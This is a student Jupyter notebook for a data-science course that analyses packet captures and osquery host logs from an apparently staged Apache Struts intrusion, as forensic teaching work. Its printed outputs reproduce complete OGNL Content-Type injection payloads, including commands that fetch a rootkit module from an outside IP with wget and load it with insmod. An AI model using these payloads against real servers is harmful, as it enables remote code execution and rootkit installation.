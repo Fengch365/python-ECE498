{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# ECE 498 DS Mini Project 3 - Checkpoint 1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "$\n",
    "\\textbf{Group members (all registered):}\\\\ \\ \\\\\n",
    "\\text{Boyang Zhou (NetID: boyangz3)}\\\\\n",
    "\\text{Chuhao Feng (NetID: chuhaof2)}\\\\\n",
    "\\text{Mengxuan Yu (NetID: my13)}\n",
    "$"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# import necessary modules\n",
    "\n",
    "import pandas as pd\n",
    "import pyshark\n",
    "import matplotlib.pyplot as plt\n",
    "import numpy as np\n",
    "import datetime\n",
    "\n",
    "from pandas import json_normalize"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## TASK 0 - Introduction & Data Preprocessing"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 1."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 2."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 3."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# Import the DNS and HTTP(2) pcap files into your notebook using pyshark.FileCapture\n",
    "\n",
    "http = pyshark.FileCapture('http.pcap', keep_packets=True)\n",
    "http2 = pyshark.FileCapture('http2.pcap', keep_packets=True)\n",
    "dns = pyshark.FileCapture('dns.pcap', keep_packets=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# go through the pcap files till the very end\n",
    "\n",
    "# http\n",
    "try:\n",
    "    i = 0\n",
    "    while True:\n",
    "        http[i]\n",
    "        i += 1\n",
    "except KeyError:\n",
    "    pass\n",
    "\n",
    "# http2\n",
    "try:\n",
    "    i = 0\n",
    "    while True:\n",
    "        http2[i]\n",
    "        i += 1\n",
    "except KeyError:\n",
    "    pass\n",
    "\n",
    "# dns\n",
    "try:\n",
    "    i = 0\n",
    "    while True:\n",
    "        dns[i]\n",
    "        i += 1\n",
    "except KeyError:\n",
    "    pass"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# Create new pandas dataframes for DNS and HTTP(2) pcaps\n",
    "\n",
    "# http\n",
    "df_data = []\n",
    "for pkt in http:\n",
    "    d = {\n",
    "        'sniff_time': pkt.sniff_time,\n",
    "        'length': int(pkt.length),\n",
    "        'highest_layer': pkt.highest_layer\n",
    "    }\n",
    "    df_data.append(d)\n",
    "    \n",
    "df_http = pd.DataFrame(df_data)\n",
    "\n",
    "# http2\n",
    "df_data = []\n",
    "for pkt in http2:\n",
    "    d = {\n",
    "        'sniff_time': pkt.sniff_time,\n",
    "        'length': int(pkt.length),\n",
    "        'highest_layer': pkt.highest_layer\n",
    "    }\n",
    "    df_data.append(d)\n",
    "    \n",
    "df_http2 = pd.DataFrame(df_data)\n",
    "\n",
    "# dns\n",
    "df_data = []\n",
    "for pkt in dns:\n",
    "    d = {\n",
    "        'sniff_time': pkt.sniff_time,\n",
    "        'length': int(pkt.length),\n",
    "        'highest_layer': pkt.highest_layer,\n",
    "        'src_ip': pkt.ip.src,\n",
    "        'dst_ip': pkt.ip.dst\n",
    "    }\n",
    "    df_data.append(d)\n",
    "    \n",
    "df_dns = pd.DataFrame(df_data)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 4."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# read in pf.log\n",
    "with open('osqueryd.results.log') as f:\n",
    "    lines = f.readlines()#open and read the content in 'pf.log' and close it\n",
    "    f.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# each line is a string represents a nested dictionary\n",
    "# using the eval() to convert string as a dictionary\n",
    "# use the json_normalize in pandas module to flatten the nested dictionary \n",
    "list_dict=[]\n",
    "for i in range(len(lines)):\n",
    "    temp_dict=eval(lines[i])\n",
    "    list_dict.append(temp_dict)\n",
    "#the resulted dataframe of file \"osqueryd.results.log\"\n",
    "os_log=json_normalize(list_dict)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 5."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# Export our created pandas dataframes as CSV files\n",
    "\n",
    "df_http.to_csv(\"df_http.csv\", sep='\\t')\n",
    "df_http2.to_csv(\"df_http2.csv\", sep='\\t')\n",
    "df_dns.to_csv(\"df_dns.csv\", sep='\\t')\n",
    "os_log.to_csv(\"os_log.csv\", index=False) "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 6."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "http.pcap\n",
      "\n",
      "text/html;charset=ISO-8859-1\n",
      "text/javascript\n",
      "text/html\n",
      "text/html;charset=ISO-8859-1\n",
      "text/javascript\n",
      "text/html;charset=ISO-8859-1\n",
      "text/html;charset=ISO-8859-1\n",
      "text/css\n",
      "text/javascript\n",
      "text/html;charset=ISO-8859-1\n",
      "text/javascript\n",
      "text/css\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "image/png\n",
      "text/html;charset=UTF-8\n",
      "image/png\n",
      "text/html;charset=UTF-8\n",
      "text/html;charset=ISO-8859-1\n",
      "text/javascript\n",
      "text/html;charset=ISO-8859-1\n",
      "text/html;charset=UTF-8\n",
      "text/html;charset=ISO-8859-1\n",
      ".multipart/form-data~${#context[\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"].addHeader(\"LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL\",1330+7)}\n",
      "text/html;charset=ISO-8859-1\n",
      ".multipart/form-data~${#context[\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"].addHeader(\"LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL\",1330+7)}\n",
      "text/html;charset=ISO-8859-1\n",
      ".multipart/form-data~${#context[\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"].addHeader(\"LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL\",1330+7)}\n",
      "text/html;charset=ISO-8859-1\n",
      "application/x-www-form-urlencoded\n",
      "text/html;charset=ISO-8859-1\n",
      "application/x-www-form-urlencoded\n",
      "text/html;charset=ISO-8859-1\n",
      "application/x-www-form-urlencoded\n",
      "text/html;charset=ISO-8859-1\n",
      "application/x-www-form-urlencoded\n",
      "text/html;charset=ISO-8859-1\n",
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n",
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n",
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://162.212.156.148/rk.ko > rk.ko').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n",
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://162.212.156.148/rk.ko > rk.ko').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n",
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='insmod rk.ko.1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n",
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='insmod rk.ko.1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n",
      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='insmod rk.ko.1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n",
      "\n",
      "\n",
      "http2.pcap\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# Take a look at http.pcap and http2.pcap for a “#cmd” string in Content-Type header\n",
    "\n",
    "# http\n",
    "print(\"http.pcap\\n\")\n",
    "for i in range(len(http)):\n",
    "    try:\n",
    "        print(http[i].http.content_type)\n",
    "    except AttributeError:\n",
    "        pass\n",
    "\n",
    "# http2\n",
    "print(\"\\n\\nhttp2.pcap\\n\")\n",
    "for i in range(len(http2)):\n",
    "    try:\n",
    "        print(http2[i].http.content_type)\n",
    "    except AttributeError:\n",
    "        pass"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "$\n",
    "\\text{By observation, http.pcap represents attacker activity while http2.pcap represents legitimate activity.}\\\\\n",
    "\\text{According to the code cell above, we cannot find any content_type in http2.pcap, the legitimate activity}\\\\ \n",
    "\\text{pcap file, so we cannot determine the content-type in legitimate activity pcap file.}\n",
    "$"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 7."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## TASK 1 - Data Exploration/Forensics Prior To Building a Machine Learning Model"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### HTTP Traffic Analysis (Attack Stages 1-2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {
    "collapsed": true,
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "# use http.pcap for the following analysis"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 1.a"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The UNIX timestamp of the first attempted scan on the vulnerable server: 1521394903.610774000\n"
     ]
    }
   ],
   "source": [
    "# Report the UNIX timestamp of the first attempted scan on the vulnerable server\n",
    "\n",
    "fir_atp = 0\n",
    "for i in range(len(http)):\n",
    "    try:\n",
    "        if (http[i].http.request_uri == '/showcase.action'):\n",
    "            fir_atp = i\n",
    "            break\n",
    "    except AttributeError:\n",
    "        pass\n",
    "    \n",
    "print(\"The UNIX timestamp of the first attempted scan on the vulnerable server:\", http[fir_atp].sniff_timestamp)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 1.b"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The IP address of the vulnerable server: 172.17.0.2\n"
     ]
    }
   ],
   "source": [
    "# Identify the IP address of the vulnerable server\n",
    "\n",
    "print(\"The IP address of the vulnerable server:\", http[fir_atp].ip.dst)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 1.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The port of the vulnerable server: 8080\n"
     ]
    }
   ],
   "source": [
    "# Identify the port of the vulnerable server\n",
    "\n",
    "print(\"The port of the vulnerable server:\", http[fir_atp].tcp.dstport)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 2.a"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "A list of the Content-Type headers sent to the vulnerable server:\n",
      "\n",
      "[('.multipart/form-data~${#context[\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"].addHeader(\"LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL\",1330+7)}', 144), ('.multipart/form-data~${#context[\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"].addHeader(\"LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL\",1330+7)}', 144), ('.multipart/form-data~${#context[\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"].addHeader(\"LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL\",1330+7)}', 144), ('application/x-www-form-urlencoded', 33), ('application/x-www-form-urlencoded', 33), ('application/x-www-form-urlencoded', 33), ('application/x-www-form-urlencoded', 33), (\"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\", 806), (\"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\", 810), (\"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://162.212.156.148/rk.ko > rk.ko').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\", 845), (\"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://162.212.156.148/rk.ko > rk.ko').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\", 845), (\"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='insmod rk.ko.1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\", 818), (\"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='insmod rk.ko.1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\", 818), (\"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='insmod rk.ko.1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\", 818)]\n"
     ]
    }
   ],
   "source": [
    "# Extract a list of the Content-Type headers sent to the vulnerable server\n",
    "\n",
    "ls_content_type = []\n",
    "for i in range(len(http)):\n",
    "    try:\n",
    "        if (http[i].ip.dst == '172.17.0.2'): # sent to the vulnerable server\n",
    "            ls_content_type.append((http[i].http.content_type, len(http[i].http.content_type))) # the Content-Type headers\n",
    "    except AttributeError:\n",
    "        pass\n",
    "\n",
    "print(\"A list of the Content-Type headers sent to the vulnerable server:\\n\")\n",
    "print(ls_content_type)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 2.b"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'whoami': 'Yes', 'wget': 'Yes', 'ls': 'Yes', 'cat': 'No', 'cd': 'No', 'insmod': 'Yes', 'ssh': 'No', 'lsmod': 'No'}\n"
     ]
    }
   ],
   "source": [
    "# Identify in the table below the UNIX commands that are present in the extracted Content-Type headers\n",
    "\n",
    "dic = {\"whoami\":\"No\", \"wget\":\"No\", \"ls\":\"No\", \"cat\":\"No\", \"cd\":\"No\", \"insmod\":\"No\", \"ssh\":\"No\", \"lsmod\":\"No\"}\n",
    "for i in range(len(ls_content_type)):\n",
    "    if \"#cmd='whoami\" in ls_content_type[i][0]:\n",
    "        dic['whoami'] = \"Yes\"\n",
    "    elif \"#cmd='wget\" in ls_content_type[i][0]:\n",
    "        dic['wget'] = \"Yes\"\n",
    "    elif \"#cmd='ls\" in ls_content_type[i][0]:\n",
    "        dic['ls'] = \"Yes\"\n",
    "    elif \"#cmd='cat\" in ls_content_type[i][0]:\n",
    "        dic['cat'] = \"Yes\"\n",
    "    elif \"#cmd='cd\" in ls_content_type[i][0]:\n",
    "        dic['cd'] = \"Yes\"\n",
    "    elif \"#cmd='insmod\" in ls_content_type[i][0]:\n",
    "        dic['insmod'] = \"Yes\"\n",
    "    elif \"#cmd='ssh\" in ls_content_type[i][0]:\n",
    "        dic['ssh'] = \"Yes\"\n",
    "    elif \"#cmd='lsmod\" in ls_content_type[i][0]:\n",
    "        dic['lsmod'] = \"Yes\"\n",
    "        \n",
    "print(dic)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Host Logs Analysis (Attack Stages 3-5)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 1."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['name', 'hostIdentifier', 'calendarTime', 'unixTime', 'epoch', 'counter', 'action', 'decorations.host_uuid', 'decorations.username', 'columns.name', 'columns.action', 'columns.atime', 'columns.category', 'columns.ctime', 'columns.gid', 'columns.hashed', 'columns.inode', 'columns.md5', 'columns.mode', 'columns.mtime', 'columns.sha1', 'columns.sha256', 'columns.size', 'columns.target_path', 'columns.time', 'columns.transaction_id', 'columns.uid']\n"
     ]
    }
   ],
   "source": [
    "# Provide a list of kernel modules added or removed from the system\n",
    "\n",
    "# the name of each column\n",
    "columns_name=list(os_log)\n",
    "print(columns_name)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "kernel module (added/removed) list:\n",
      "\n",
      " ['rk', 'ipt_MASQUERADE', 'nf_nat_masquerade_ipv4', 'nf_conntrack_netlink', 'nfnetlink', 'xfrm_user', 'xfrm_algo', 'iptable_nat', 'nf_conntrack_ipv4', 'nf_defrag_ipv4', 'nf_nat_ipv4', 'xt_addrtype', 'iptable_filter', 'ip_tables', 'xt_conntrack', 'x_tables', 'nf_nat', 'nf_conntrack', 'br_netfilter', 'bridge', 'stp', 'llc', 'overlay', 'ppdev', 'intel_powerclamp', 'crct10dif_pclmul', 'crc32_pclmul', 'ghash_clmulni_intel', 'aesni_intel', 'aes_x86_64', 'lrw', 'vboxvideo', 'gf128mul', 'glue_helper', 'ablk_helper', 'cryptd', 'ttm', 'drm_kms_helper', 'snd_intel8x0', 'snd_ac97_codec', 'ac97_bus', 'input_leds', 'joydev', 'serio_raw', 'snd_pcm', 'drm', 'fb_sys_fops', 'snd_timer', 'syscopyarea', 'sysfillrect', 'i2c_piix4', 'snd', 'sysimgblt', 'soundcore', 'vboxguest', '8250_fintek', 'parport_pc', 'parport', 'mac_hid', 'autofs4', 'hid_generic', 'usbhid', 'hid', 'psmouse', 'ahci', 'libahci', 'e1000', 'pata_acpi', 'fjes', 'video', 'xt_nat', 'xt_tcpudp', 'veth', 'floppy', 'xor', 'raid6_pq', 'ufs', 'qnx4', 'hfsplus', 'hfs', 'minix', 'ntfs', 'msdos', 'jfs', 'xfs', 'libcrc32c', 'btrfs', 'nfnetlink_queue', 'nfnetlink_log', 'bluetooth']\n"
     ]
    }
   ],
   "source": [
    "# get a list of (unique) kernel modules added or removed from the system\n",
    "list_kernel_module=list(os_log.loc[(os_log['name']=='kernel_module')]['columns.name'].unique())\n",
    "# the none unique module list\n",
